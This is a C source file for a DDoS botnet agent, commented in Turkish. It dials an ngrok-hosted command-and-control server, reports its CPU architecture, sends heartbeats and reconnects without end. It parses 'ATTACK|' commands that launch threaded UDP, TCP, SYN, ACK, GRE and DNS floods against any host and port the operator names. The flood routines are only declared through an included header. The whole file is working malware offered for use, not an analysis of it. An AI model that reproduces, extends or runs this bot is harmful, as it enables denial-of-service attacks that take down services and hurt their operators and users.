#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>
#include <pthread.h>
#include <netdb.h>
#include "attack.h"

#define SERVER_IP      "0.tcp.eu.ngrok.io"
#define SERVER_PORT    13276
#define RETRY_DELAY    10
#define PING_INTERVAL  10
#define BUFFER_SIZE    4096

/* ============================================================
 *  Mimari tespiti — Go server INFO| satirini bekliyor
 * ============================================================ */
static const char *get_arch(void)
{
#if defined(__x86_64__) || defined(_M_X64)
    return "x64";
#elif defined(__i386__) || defined(_M_IX86)
    return "x86";
#elif defined(__aarch64__) || defined(_M_ARM64)
    return "arm";
#else
    return "other";
#endif
}

/* ============================================================
 *  Attack thread — her ATTACK komutu ayri thread'de calisir,
 *  communicate_with_server() bloklanmaz.
 * ============================================================ */
typedef struct {
    char method[32];
    char host[256];
    int  port;
    int  duration;
    int  threads;
    int  rps;
} attack_params_t;

static void *attack_thread(void *arg)
{
    attack_params_t *p = (attack_params_t *)arg;

    printf("[ATTACK] START method=%s host=%s port=%d duration=%d threads=%d rps=%d\n",
           p->method, p->host, p->port, p->duration, p->threads, p->rps);

    if      (strcmp(p->method, "UDPFLOOD") == 0)
        start_udpflood(p->host, p->port, p->duration, p->threads, p->rps);
    else if (strcmp(p->method, "TCPFLOOD") == 0)
        start_tcpflood(p->host, p->port, p->duration, p->threads, p->rps);
    else if (strcmp(p->method, "SYNFLOOD") == 0)
        start_synflood(p->host, p->port, p->duration, p->threads, p->rps);
    else if (strcmp(p->method, "ACKFLOOD") == 0)
        start_ackflood(p->host, p->port, p->duration, p->threads, p->rps);
    else if (strcmp(p->method, "GREFLOOD") == 0)
        start_greflood(p->host, p->port, p->duration, p->threads, p->rps);
    else if (strcmp(p->method, "DNSFLOOD") == 0)
        start_dnsflood(p->host, p->port, p->duration, p->threads, p->rps);
    else
        printf("[ATTACK] UNKNOWN method=%s\n", p->method);

    printf("[ATTACK] END   method=%s host=%s\n", p->method, p->host);

    free(p);
    return NULL;
}

/* ============================================================
 *  ATTACK|<METHOD>|<host>|<port>|<duration>|<threads>|<rps>
 *  rps alani yoksa veya 0 ise throttle uygulanmaz.
 * ============================================================ */
static void dispatch_attack(const char *line)
{
    char copy[BUFFER_SIZE];
    strncpy(copy, line, sizeof copy - 1);
    copy[sizeof copy - 1] = '\0';

    char *tok = strtok(copy, "|");  /* "ATTACK" */
    if (!tok) return;

    attack_params_t *p = calloc(1, sizeof *p);
    if (!p) return;

    tok = strtok(NULL, "|");        /* method */
    if (!tok) { free(p); return; }
    strncpy(p->method, tok, sizeof p->method - 1);

    tok = strtok(NULL, "|");        /* host */
    if (!tok) { free(p); return; }
    strncpy(p->host, tok, sizeof p->host - 1);

    tok = strtok(NULL, "|");        /* port */
    p->port = tok ? atoi(tok) : 80;

    tok = strtok(NULL, "|");        /* duration */
    p->duration = tok ? atoi(tok) : 60;
    if (p->duration <= 0) p->duration = 60;

    tok = strtok(NULL, "|");        /* threads */
    p->threads = tok ? atoi(tok) : 1;
    if (p->threads <= 0) p->threads = 1;

    tok = strtok(NULL, "|");        /* rps — opsiyonel, yoksa 0 (limitsiz) */
    p->rps = tok ? atoi(tok) : 0;

    pthread_t tid;
    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
    if (pthread_create(&tid, &attr, attack_thread, p) != 0)
        free(p);
    pthread_attr_destroy(&attr);
}

/* ============================================================
 *  Sunucudan gelen tek bir satiri isle
 * ============================================================ */
static void handle_line(const char *line)
{
    if (strncmp(line, "ATTACK|", 7) == 0) {
        dispatch_attack(line);
        return;
    }
    /* Gelecekte eklenebilecek komutlar buraya */
}

/* ============================================================
 *  Baglanti
 *  FIX: inet_pton sadece ham IP kabul eder; ngrok gibi
 *       hostname'leri cozemez. getaddrinfo kullanarak DNS
 *       cozumlemesi yapiliyor — hem IP hem hostname destegi.
 * ============================================================ */
static int connect_to_server(void)
{
    char port_str[16];
    snprintf(port_str, sizeof port_str, "%d", SERVER_PORT);

    struct addrinfo hints, *res, *rp;
    memset(&hints, 0, sizeof hints);
    hints.ai_family   = AF_UNSPEC;   /* IPv4 ve IPv6 destegi */
    hints.ai_socktype = SOCK_STREAM;

    int rc = getaddrinfo(SERVER_IP, port_str, &hints, &res);
    if (rc != 0) {
        printf("[INFO] DNS resolve failed: %s\n", gai_strerror(rc));
        return -1;
    }

    int sock = -1;
    for (rp = res; rp != NULL; rp = rp->ai_next) {
        sock = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
        if (sock < 0)
            continue;
        if (connect(sock, rp->ai_addr, rp->ai_addrlen) == 0)
            break;
        close(sock);
        sock = -1;
    }
    freeaddrinfo(res);

    if (sock < 0) {
        printf("[INFO] Connection failed\n");
        return -1;
    }

    /* Go server ilk satir olarak "INFO|<arch>\n" bekliyor */
    char handshake[64];
    snprintf(handshake, sizeof handshake, "INFO|%s\n", get_arch());
    send(sock, handshake, strlen(handshake), 0);

    printf("[INFO] Connected to %s:%d (arch=%s)\n",
           SERVER_IP, SERVER_PORT, get_arch());
    return sock;
}

/* ============================================================
 *  Ana iletisim dongusu
 *  - select() ile 1 saniyelik timeout
 *  - Satir tamponlama: recv() partial chunk gelebilir;
 *    '\n' gorene kadar biriktir, sonra isle.
 *  - Her PING_INTERVAL saniyede bir "PING\n" gonder
 * ============================================================ */
static void communicate_with_server(int sock)
{
    char    buf[BUFFER_SIZE];
    char    line[BUFFER_SIZE];
    int     line_len = 0;
    time_t  last_ping = 0;

    while (1) {
        fd_set rfds;
        struct timeval tv = {1, 0};
        FD_ZERO(&rfds);
        FD_SET(sock, &rfds);

        int rv = select(sock + 1, &rfds, NULL, NULL, &tv);
        if (rv < 0) break;

        if (rv > 0 && FD_ISSET(sock, &rfds)) {
            int n = recv(sock, buf, sizeof buf - 1, 0);
            if (n <= 0) {
                printf("[INFO] Connection lost\n");
                break;
            }
            buf[n] = '\0';

            for (int i = 0; i < n; i++) {
                char c = buf[i];
                if (c == '\n') {
                    line[line_len] = '\0';
                    if (line_len > 0)
                        handle_line(line);
                    line_len = 0;
                } else if (line_len < (int)sizeof(line) - 1) {
                    line[line_len++] = c;
                }
            }
        }

        /* PING gonder */
        time_t now = time(NULL);
        if (difftime(now, last_ping) >= PING_INTERVAL) {
            if (send(sock, "PING\n", 5, 0) < 0) break;
            last_ping = now;
        }
    }
}

/* ============================================================
 *  main
 * ============================================================ */
int main(void)
{
    while (1) {
        int sock = connect_to_server();
        if (sock < 0) {
            printf("[INFO] Reconnecting in %d seconds...\n", RETRY_DELAY);
            sleep(RETRY_DELAY);
            continue;
        }

        communicate_with_server(sock);
        close(sock);

        printf("[INFO] Reconnecting in %d seconds...\n", RETRY_DELAY);
        sleep(RETRY_DELAY);
    }
    return 0;
}
